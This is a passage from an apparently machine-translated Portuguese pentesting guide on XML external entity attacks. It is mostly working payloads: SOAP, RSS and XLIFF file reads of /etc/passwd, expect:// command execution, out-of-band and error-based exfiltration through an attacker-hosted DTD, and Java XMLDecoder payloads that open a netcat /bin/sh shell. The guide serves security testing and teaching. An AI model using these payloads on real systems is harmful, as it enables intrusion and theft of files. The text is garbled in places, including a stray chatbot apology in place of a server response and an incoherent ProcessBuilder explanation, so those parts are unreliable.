```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Execução remota de código

**Se o módulo "expect" do PHP estiver carregado**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol) é um protocolo baseado em XML usado para acessar serviços web. Ele usa XML para codificar sua mensagem e geralmente é transportado usando HTTP.

Uma vulnerabilidade comum em serviços SOAP é a Injeção de Entidade Externa XML (XEE). Isso ocorre quando o serviço não valida adequadamente as entradas XML recebidas, permitindo que um invasor injete uma entidade externa maliciosa que pode ser usada para ler arquivos do sistema ou executar código arbitrário.

Para explorar essa vulnerabilidade, um invasor pode enviar uma solicitação SOAP contendo uma entidade externa maliciosa, como a seguinte:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://services.mycompany.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:getUser>
         <username>&xxe;</username>
      </ser:getUser>
   </soapenv:Body>
</soapenv:Envelope>
```

Nesse exemplo, a entidade externa `xxe` é definida como o conteúdo do arquivo `/etc/passwd`. Quando a solicitação é processada pelo serviço, o conteúdo do arquivo `/etc/passwd` é incluído na resposta SOAP, permitindo que o invasor leia informações confidenciais do sistema.

Para evitar essa vulnerabilidade, é importante validar adequadamente todas as entradas XML recebidas pelo serviço e restringir o acesso a recursos do sistema.
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Esta seção foi retirada de [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
De acordo com a [Wikipedia](https://en.wikipedia.org/wiki/XLIFF):

> XLIFF (XML Localization Interchange File Format) é um formato de bitexto baseado em XML criado para padronizar a forma como os dados localizáveis são passados entre e entre ferramentas durante um processo de localização e um formato comum para a troca de ferramentas CAT.

### Solicitação cega
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
O servidor responde com um erro:
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Mas tivemos um acerto no Burp Collaborator.

### Exfiltrando dados via Out of Band
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Com base no User Agent exibido pelo burp collaborator, parece que ele está usando **Java 1.8**. Um dos problemas ao explorar XXE nesta versão do Java é que **não conseguimos obter arquivos contendo uma `Nova Linha`** como `/etc/passwd` usando a técnica Out of Band.

### Exfiltrando dados via erro baseado

Arquivo DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Desculpe, não entendi o que você quer dizer com "Server Response:". Você pode me dar mais informações ou fazer uma nova solicitação?
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Ótimo! O arquivo `non-exist` é refletido nas mensagens de erro. O próximo passo é adicionar o conteúdo do arquivo.

Arquivo DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
E o conteúdo do arquivo foi **impresso na saída do erro enviado via HTTP** com sucesso.

## RSS - XEE

XML válido com formato RSS para explorar uma vulnerabilidade XXE.

### Ping back

Simples requisição HTTP para o servidor do atacante.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler arquivo

O ataque de Entidade Externa XML (XXE) pode ser usado para ler arquivos do sistema de arquivos do servidor. Para fazer isso, o atacante precisa criar um arquivo XML malicioso que contenha uma referência a um arquivo no sistema de arquivos do servidor. Quando o servidor processa o arquivo XML, ele tenta resolver a referência do arquivo e, se bem-sucedido, o conteúdo do arquivo é retornado na resposta.

Por exemplo, o seguinte XML malicioso pode ser usado para ler o arquivo `/etc/passwd` em um sistema Linux:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

O resultado da solicitação incluirá o conteúdo do arquivo `/etc/passwd`. Esse tipo de ataque pode ser usado para obter informações confidenciais, como senhas de usuário e chaves de API.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler código fonte

Usando o filtro base64 do PHP
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE para RCE

XMLDecoder é uma classe Java que cria objetos com base em uma mensagem XML. Se um usuário mal-intencionado conseguir fazer com que um aplicativo use dados arbitrários em uma chamada ao método **readObject**, ele instantaneamente ganhará execução de código no servidor.

### Usando Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```
### ProcessBuilder

O `ProcessBuilder` é uma classe Java que permite executar comandos em um novo processo. É comumente usado para executar comandos do sistema operacional, como `ls` ou `dir`. No entanto, também pode ser usado para executar comandos personalizados.

Um exemplo de uso do `ProcessBuilder` é executar um comando que lê um arquivo XML e imprime seu conteúdo no console. No entanto, se o arquivo XML contiver uma entidade externa, o `ProcessBuilder` pode ser usado para explorar uma vulnerabilidade de Injeção de Entidade Externa (XXE).

Para explorar essa vulnerabilidade, o atacante pode criar um arquivo XML malicioso que contenha uma entidade externa que aponte para um arquivo no sistema do alvo. Quando o comando é executado pelo `ProcessBuilder`, a entidade externa é resolvida e o conteúdo do arquivo é incluído na saída do comando. Isso pode permitir que o atacante leia arquivos confidenciais no sistema do alvo.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>9999</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/sh</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```
## Ferramentas

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Mais recursos

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extrair informações via HTTP usando DTD externo próprio: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
